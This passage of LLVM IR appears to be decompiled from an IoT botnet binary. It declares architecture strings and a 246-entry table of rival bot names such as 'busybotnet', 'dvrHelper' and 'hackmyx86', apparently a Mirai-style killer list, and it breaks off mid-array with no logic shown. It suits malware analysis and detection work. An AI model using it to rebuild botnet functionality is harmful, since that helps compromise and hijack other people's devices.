source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@cf = internal unnamed_addr global i1 false
@df = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805300c.2 = global i32 0
@global_var_8053024.3 = local_unnamed_addr global i32* @global_var_805300c.2
@global_var_8052e04.4 = constant i32 0
@global_var_8053764.5 = global i32 0
@global_var_8053010.6 = local_unnamed_addr global i32 0
@global_var_8050ba0.7 = constant [5 x i8] c"mips\00"
@global_var_8050ba5.8 = constant [7 x i8] c"mips64\00"
@global_var_8050bac.9 = constant [7 x i8] c"mipsel\00"
@global_var_8050bb3.10 = constant [6 x i8] c"sh2eb\00"
@global_var_8050bb9.11 = constant [7 x i8] c"sh2elf\00"
@global_var_8050bc0.12 = constant [4 x i8] c"sh4\00"
@global_var_8050bc4.13 = constant [4 x i8] c"x86\00"
@global_var_8050bc8.14 = constant [4 x i8] c"arm\00"
@global_var_8050bcc.15 = constant [6 x i8] c"armv5\00"
@global_var_8050bd2.16 = constant [8 x i8] c"armv4tl\00"
@global_var_8050bda.17 = constant [6 x i8] c"armv4\00"
@global_var_8050be0.18 = constant [6 x i8] c"armv6\00"
@global_var_8050be6.19 = constant [5 x i8] c"i686\00"
@global_var_8050beb.20 = constant [8 x i8] c"powerpc\00"
@global_var_8050bf3.21 = constant [13 x i8] c"powerpc440fp\00"
@global_var_8050c00.22 = constant [5 x i8] c"i586\00"
@global_var_8050c05.23 = constant [5 x i8] c"m68k\00"
@global_var_8050c0a.24 = constant [6 x i8] c"sparc\00"
@global_var_8050c10.25 = constant [7 x i8] c"x86_64\00"
@global_var_8050c17.26 = constant [11 x i8] c"jackmymips\00"
@global_var_8050c22.27 = constant [13 x i8] c"jackmymips64\00"
@global_var_8050c2f.28 = constant [13 x i8] c"jackmymipsel\00"
@global_var_8050c3c.29 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_8050c48.30 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_8050c55.31 = constant [10 x i8] c"jackmysh4\00"
@global_var_8050c5f.32 = constant [10 x i8] c"jackmyx86\00"
@global_var_8050c69.33 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_8050c75.34 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_8050c83.35 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_8050c8f.36 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_8050c9b.37 = constant [11 x i8] c"jackmyi686\00"
@global_var_8050ca6.38 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_8050cb4.39 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_8050cc7.40 = constant [11 x i8] c"jackmyi586\00"
@global_var_8050cd2.41 = constant [11 x i8] c"jackmym68k\00"
@global_var_8050cdd.42 = constant [12 x i8] c"jackmysparc\00"
@global_var_8050ce9.43 = constant [13 x i8] c"jackmyx86_64\00"
@global_var_8050cf6.44 = constant [11 x i8] c"hackmymips\00"
@global_var_8050d01.45 = constant [13 x i8] c"hackmymips64\00"
@global_var_8050d0e.46 = constant [13 x i8] c"hackmymipsel\00"
@global_var_8050d1b.47 = constant [12 x i8] c"hackmysh2eb\00"
@global_var_8050d27.48 = constant [13 x i8] c"hackmysh2elf\00"
@global_var_8050d34.49 = constant [10 x i8] c"hackmysh4\00"
@global_var_8050d3e.50 = constant [10 x i8] c"hackmyx86\00"
@global_var_8050d48.51 = constant [12 x i8] c"hackmyarmv5\00"
@global_var_8050d54.52 = constant [14 x i8] c"hackmyarmv4tl\00"
@global_var_8050d62.53 = constant [12 x i8] c"hackmyarmv4\00"
@global_var_8050d6e.54 = constant [12 x i8] c"hackmyarmv6\00"
@global_var_8050d7a.55 = constant [11 x i8] c"hackmyi686\00"
@global_var_8050d85.56 = constant [14 x i8] c"hackmypowerpc\00"
@global_var_8050d93.57 = constant [19 x i8] c"hackmypowerpc440fp\00"
@global_var_8050da6.58 = constant [11 x i8] c"hackmyi586\00"
@global_var_8050db1.59 = constant [11 x i8] c"hackmym68k\00"
@global_var_8050dbc.60 = constant [12 x i8] c"hackmysparc\00"
@global_var_8050dc8.61 = constant [13 x i8] c"hackmyx86_64\00"
@global_var_8050dd5.62 = constant [3 x i8] c"b1\00"
@global_var_8050dd8.63 = constant [3 x i8] c"b2\00"
@global_var_8050ddb.64 = constant [3 x i8] c"b3\00"
@global_var_8050dde.65 = constant [3 x i8] c"b4\00"
@global_var_8050de1.66 = constant [3 x i8] c"b5\00"
@global_var_8050de4.67 = constant [3 x i8] c"b6\00"
@global_var_8050de7.68 = constant [3 x i8] c"b7\00"
@global_var_8050dea.69 = constant [3 x i8] c"b8\00"
@global_var_8050ded.70 = constant [3 x i8] c"b9\00"
@global_var_8050df0.71 = constant [4 x i8] c"b10\00"
@global_var_8050df4.72 = constant [4 x i8] c"b11\00"
@global_var_8050df8.73 = constant [4 x i8] c"b12\00"
@global_var_8050dfc.74 = constant [4 x i8] c"b13\00"
@global_var_8050e00.75 = constant [4 x i8] c"b14\00"
@global_var_8050e04.76 = constant [4 x i8] c"b15\00"
@global_var_8050e08.77 = constant [4 x i8] c"b16\00"
@global_var_8050e0c.78 = constant [4 x i8] c"b17\00"
@global_var_8050e10.79 = constant [4 x i8] c"b18\00"
@global_var_8050e14.80 = constant [4 x i8] c"b19\00"
@global_var_8050e18.81 = constant [4 x i8] c"b20\00"
@global_var_8050e1c.82 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_8050e2d.83 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_8050e36.84 = constant [10 x i8] c"dvrHelper\00"
@global_var_8050e40.85 = constant [8 x i8] c"FDFDHFC\00"
@global_var_8050e48.86 = constant [5 x i8] c"FEUB\00"
@global_var_8050e4d.87 = constant [9 x i8] c"FTUdftui\00"
@global_var_8050e56.88 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_8050e5f.89 = constant [6 x i8] c"jhUOH\00"
@global_var_8050e65.90 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_8050e6e.91 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_8050e78.92 = constant [8 x i8] c"kmymips\00"
@global_var_8050e80.93 = constant [10 x i8] c"kmymips64\00"
@global_var_8050e8a.94 = constant [10 x i8] c"kmymipsel\00"
@global_var_8050e94.95 = constant [9 x i8] c"kmysh2eb\00"
@global_var_8050e9d.96 = constant [10 x i8] c"kmysh2elf\00"
@global_var_8050ea7.97 = constant [7 x i8] c"kmysh4\00"
@global_var_8050eae.98 = constant [7 x i8] c"kmyx86\00"
@global_var_8050eb5.99 = constant [9 x i8] c"kmyarmv5\00"
@global_var_8050ebe.100 = constant [11 x i8] c"kmyarmv4tl\00"
@global_var_8050ec9.101 = constant [9 x i8] c"kmyarmv4\00"
@global_var_8050ed2.102 = constant [9 x i8] c"kmyarmv6\00"
@global_var_8050edb.103 = constant [8 x i8] c"kmyi686\00"
@global_var_8050ee3.104 = constant [11 x i8] c"kmypowerpc\00"
@global_var_8050eee.105 = constant [16 x i8] c"kmypowerpc440fp\00"
@global_var_8050efe.106 = constant [8 x i8] c"kmyi586\00"
@global_var_8050f06.107 = constant [8 x i8] c"kmym68k\00"
@global_var_8050f0e.108 = constant [9 x i8] c"kmysparc\00"
@global_var_8050f17.109 = constant [10 x i8] c"kmyx86_64\00"
@global_var_8050f21.110 = constant [8 x i8] c"lolmips\00"
@global_var_8050f29.111 = constant [10 x i8] c"lolmips64\00"
@global_var_8050f33.112 = constant [10 x i8] c"lolmipsel\00"
@global_var_8050f3d.113 = constant [9 x i8] c"lolsh2eb\00"
@global_var_8050f46.114 = constant [10 x i8] c"lolsh2elf\00"
@global_var_8050f50.115 = constant [7 x i8] c"lolsh4\00"
@global_var_8050f57.116 = constant [7 x i8] c"lolx86\00"
@global_var_8050f5e.117 = constant [9 x i8] c"lolarmv5\00"
@global_var_8050f67.118 = constant [11 x i8] c"lolarmv4tl\00"
@global_var_8050f72.119 = constant [9 x i8] c"lolarmv4\00"
@global_var_8050f7b.120 = constant [9 x i8] c"lolarmv6\00"
@global_var_8050f84.121 = constant [8 x i8] c"loli686\00"
@global_var_8050f8c.122 = constant [11 x i8] c"lolpowerpc\00"
@global_var_8050f97.123 = constant [16 x i8] c"lolpowerpc440fp\00"
@global_var_8050fa7.124 = constant [8 x i8] c"loli586\00"
@global_var_8050faf.125 = constant [8 x i8] c"lolm68k\00"
@global_var_8050fb7.126 = constant [9 x i8] c"lolsparc\00"
@global_var_8050fc0.127 = constant [8 x i8] c"RYrydry\00"
@global_var_8050fc8.128 = constant [8 x i8] c"telmips\00"
@global_var_8050fd0.129 = constant [10 x i8] c"telmips64\00"
@global_var_8050fda.130 = constant [10 x i8] c"telmipsel\00"
@global_var_8050fe4.131 = constant [9 x i8] c"telsh2eb\00"
@global_var_8050fed.132 = constant [10 x i8] c"telsh2elf\00"
@global_var_8050ff7.133 = constant [7 x i8] c"telsh4\00"
@global_var_8050ffe.134 = constant [7 x i8] c"telx86\00"
@global_var_8051005.135 = constant [9 x i8] c"telarmv5\00"
@global_var_805100e.136 = constant [11 x i8] c"telarmv4tl\00"
@global_var_8051019.137 = constant [9 x i8] c"telarmv4\00"
@global_var_8051022.138 = constant [9 x i8] c"telarmv6\00"
@global_var_805102b.139 = constant [8 x i8] c"teli686\00"
@global_var_8051033.140 = constant [11 x i8] c"telpowerpc\00"
@global_var_805103e.141 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_805104e.142 = constant [8 x i8] c"teli586\00"
@global_var_8051056.143 = constant [8 x i8] c"telm68k\00"
@global_var_805105e.144 = constant [9 x i8] c"telsparc\00"
@global_var_8051067.145 = constant [10 x i8] c"telx86_64\00"
@global_var_8051071.146 = constant [12 x i8] c"TwoFacemips\00"
@global_var_805107d.147 = constant [14 x i8] c"TwoFacemips64\00"
@global_var_805108b.148 = constant [14 x i8] c"TwoFacemipsel\00"
@global_var_8051099.149 = constant [13 x i8] c"TwoFacesh2eb\00"
@global_var_80510a6.150 = constant [14 x i8] c"TwoFacesh2elf\00"
@global_var_80510b4.151 = constant [11 x i8] c"TwoFacesh4\00"
@global_var_80510bf.152 = constant [11 x i8] c"TwoFacex86\00"
@global_var_80510ca.153 = constant [13 x i8] c"TwoFacearmv5\00"
@global_var_80510d7.154 = constant [15 x i8] c"TwoFacearmv4tl\00"
@global_var_80510e6.155 = constant [13 x i8] c"TwoFacearmv4\00"
@global_var_80510f3.156 = constant [13 x i8] c"TwoFacearmv6\00"
@global_var_8051100.157 = constant [12 x i8] c"TwoFacei686\00"
@global_var_805110c.158 = constant [15 x i8] c"TwoFacepowerpc\00"
@global_var_805111b.159 = constant [20 x i8] c"TwoFacepowerpc440fp\00"
@global_var_805112f.160 = constant [12 x i8] c"TwoFacei586\00"
@global_var_805113b.161 = constant [12 x i8] c"TwoFacem68k\00"
@global_var_8051147.162 = constant [13 x i8] c"TwoFacesparc\00"
@global_var_8051154.163 = constant [14 x i8] c"TwoFacex86_64\00"
@global_var_8051162.164 = constant [9 x i8] c"UYyuyioy\00"
@global_var_805116b.165 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_8051174.166 = constant [5 x i8] c"xxb1\00"
@global_var_8051179.167 = constant [5 x i8] c"xxb2\00"
@global_var_805117e.168 = constant [5 x i8] c"xxb3\00"
@global_var_8051183.169 = constant [5 x i8] c"xxb4\00"
@global_var_8051188.170 = constant [5 x i8] c"xxb5\00"
@global_var_805118d.171 = constant [5 x i8] c"xxb6\00"
@global_var_8051192.172 = constant [5 x i8] c"xxb7\00"
@global_var_8051197.173 = constant [5 x i8] c"xxb8\00"
@global_var_805119c.174 = constant [5 x i8] c"xxb9\00"
@global_var_80511a1.175 = constant [6 x i8] c"xxb10\00"
@global_var_80511a7.176 = constant [6 x i8] c"xxb11\00"
@global_var_80511ad.177 = constant [6 x i8] c"xxb12\00"
@global_var_80511b3.178 = constant [6 x i8] c"xxb13\00"
@global_var_80511b9.179 = constant [6 x i8] c"xxb14\00"
@global_var_80511bf.180 = constant [6 x i8] c"xxb15\00"
@global_var_80511c5.181 = constant [6 x i8] c"xxb16\00"
@global_var_80511cb.182 = constant [6 x i8] c"xxb17\00"
@global_var_80511d1.183 = constant [6 x i8] c"xxb18\00"
@global_var_80511d7.184 = constant [6 x i8] c"xxb19\00"
@global_var_80511dd.185 = constant [6 x i8] c"xxb20\00"
@global_var_80511e3.186 = constant i32 3276849
@global_var_80511e5.187 = constant i32 3342386
@global_var_80511e7.188 = constant i32 3407923
@global_var_80511e9.189 = constant i32 3473460
@global_var_80511eb.190 = constant i32 3538997
@global_var_80511ed.191 = constant i32 3604534
@global_var_80511ef.192 = constant i32 3670071
@global_var_80511f1.193 = constant i32 3735608
@global_var_80511f3.194 = constant i32 808517689
@global_var_80511f5.195 = constant [3 x i8] c"10\00"
@global_var_80511f8.196 = constant [3 x i8] c"11\00"
@global_var_80511fb.197 = constant [3 x i8] c"12\00"
@global_var_80511fe.198 = constant [3 x i8] c"13\00"
@global_var_8051201.199 = constant [3 x i8] c"14\00"
@global_var_8051204.200 = constant [3 x i8] c"15\00"
@global_var_8051207.201 = constant [3 x i8] c"16\00"
@global_var_805120a.202 = constant [3 x i8] c"17\00"
@global_var_805120d.203 = constant [3 x i8] c"18\00"
@global_var_8051210.204 = constant [3 x i8] c"19\00"
@global_var_8051213.205 = constant [3 x i8] c"20\00"
@global_var_8051216.206 = constant [3 x i8] c"bb\00"
@global_var_8051219.207 = constant [11 x i8] c"busybotnet\00"
@global_var_8051224.208 = constant [5 x i8] c"pppd\00"
@global_var_8051229.209 = constant [6 x i8] c"pppoe\00"
@global_var_805122f.210 = constant [5 x i8] c"wput\00"
@global_var_8051234.211 = constant [3 x i8] c"B1\00"
@global_var_8051237.212 = constant [3 x i8] c"B2\00"
@global_var_805123a.213 = constant [3 x i8] c"B3\00"
@global_var_805123d.214 = constant [3 x i8] c"B4\00"
@global_var_8051240.215 = constant [3 x i8] c"B5\00"
@global_var_8051243.216 = constant [3 x i8] c"B6\00"
@global_var_8051246.217 = constant [3 x i8] c"B7\00"
@global_var_8051249.218 = constant [3 x i8] c"B8\00"
@global_var_805124c.219 = constant [3 x i8] c"B9\00"
@global_var_805124f.220 = constant [4 x i8] c"B10\00"
@global_var_8051253.221 = constant [4 x i8] c"B11\00"
@global_var_8051257.222 = constant [4 x i8] c"B12\00"
@global_var_805125b.223 = constant [4 x i8] c"B13\00"
@global_var_805125f.224 = constant [4 x i8] c"B14\00"
@global_var_8051263.225 = constant [4 x i8] c"B15\00"
@global_var_8051267.226 = constant [4 x i8] c"B16\00"
@global_var_805126b.227 = constant [4 x i8] c"B17\00"
@global_var_805126f.228 = constant [4 x i8] c"B18\00"
@global_var_8051273.229 = constant [9 x i8] c"B20hackz\00"
@global_var_805127c.230 = constant [5 x i8] c"bin*\00"
@global_var_8051281.231 = constant [5 x i8] c"gtop\00"
@global_var_8051286.232 = constant [5 x i8] c"ftp*\00"
@global_var_805128b.233 = constant [6 x i8] c"tftp*\00"
@global_var_8051291.234 = constant [7 x i8] c"botnet\00"
@global_var_8051298.235 = constant [8 x i8] c"swatnet\00"
@global_var_80512a0.236 = constant [8 x i8] c"ballpit\00"
@global_var_80512a8.237 = constant [8 x i8] c"fucknet\00"
@global_var_80512b0.238 = constant [9 x i8] c"cracknet\00"
@global_var_80512b9.239 = constant [8 x i8] c"weednet\00"
@global_var_80512c1.240 = constant [7 x i8] c"gaynet\00"
@global_var_80512c8.241 = constant [9 x i8] c"queernet\00"
@global_var_80512d1.242 = constant [8 x i8] c"ballnet\00"
@global_var_80512d9.243 = constant [5 x i8] c"unet\00"
@global_var_80512de.244 = constant [7 x i8] c"yougay\00"
@global_var_80512e5.245 = constant [7 x i8] c"sttftp\00"
@global_var_80512ec.246 = constant [7 x i8] c"sstftp\00"
@global_var_80512f3.247 = constant [7 x i8] c"sbtftp\00"
@global_var_80512fa.248 = constant [6 x i8] c"btftp\00"
@global_var_8051300.249 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_8051309.250 = constant [6 x i8] c"bruv*\00"
@global_var_805130f.251 = constant [5 x i8] c"IoT*\00"
@global_var_8053040.252 = global [246 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8050ba0.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050ba5.8, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050bac.9, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050bb3.10, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050bb9.11, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050bc0.12, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050bc4.13, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050bc8.14, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050bcc.15, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050bd2.16, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050bda.17, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050be0.18, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8050be6.19, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050beb.20, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050bf3.21, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8050c00.22, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8050c05.23, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050c0a.24, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050c10.25, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050c17.26, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050c22.27, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050c2f.28, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050c3c.29, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050c48.30, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050c55.31, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050c5f.32, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050c69.33, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8050c75.34, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050c83.35, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050c8f.36, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050c9b.37, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8050ca6.38, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_8050cb4.39, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050cc7.40, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050cd2.41, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050cdd.42, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050ce9.43, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050cf6.44, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050d01.45, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050d0e.46, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050d1b.47, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050d27.48, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050d34.49, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050d3e.50, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050d48.51, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8050d54.52, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050d62.53, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050d6e.54, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050d7a.55, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8050d85.56, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_8050d93.57, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050da6.58, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050db1.59, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050dbc.60, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050dc8.61, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050dd5.62, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050dd8.63, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050ddb.64, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050dde.65, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050de1.66, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050de4.67, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050de7.68, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050dea.69, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050ded.70, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050df0.71, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050df4.72, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050df8.73, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050dfc.74, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050e00.75, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050e04.76, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050e08.77, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050e0c.78, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050e10.79, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050e14.80, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050e18.81, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8050e1c.82, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050e2d.83, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050e36.84, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050e40.85, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8050e48.86, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050e4d.87, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050e56.88, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050e5f.89, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050e65.90, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050e6e.91, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050e78.92, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050e80.93, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050e8a.94, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050e94.95, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050e9d.96, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050ea7.97, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050eae.98, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050eb5.99, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050ebe.100, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050ec9.101, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050ed2.102, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050edb.103, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050ee3.104, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8050eee.105, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050efe.106, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050f06.107, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050f0e.108, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050f17.109, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050f21.110, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050f29.111, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050f33.112, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050f3d.113, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050f46.114, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050f50.115, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050f57.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050f5e.117, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050f67.118, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050f72.119, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050f7b.120, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050f84.121, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050f8c.122, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8050f97.123, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050fa7.124, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050faf.125, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050fb7.126, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050fc0.127, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050fc8.128, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050fd0.129, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050fda.130, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050fe4.131, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050fed.132, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050ff7.133, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050ffe.134, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8051005.135, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x 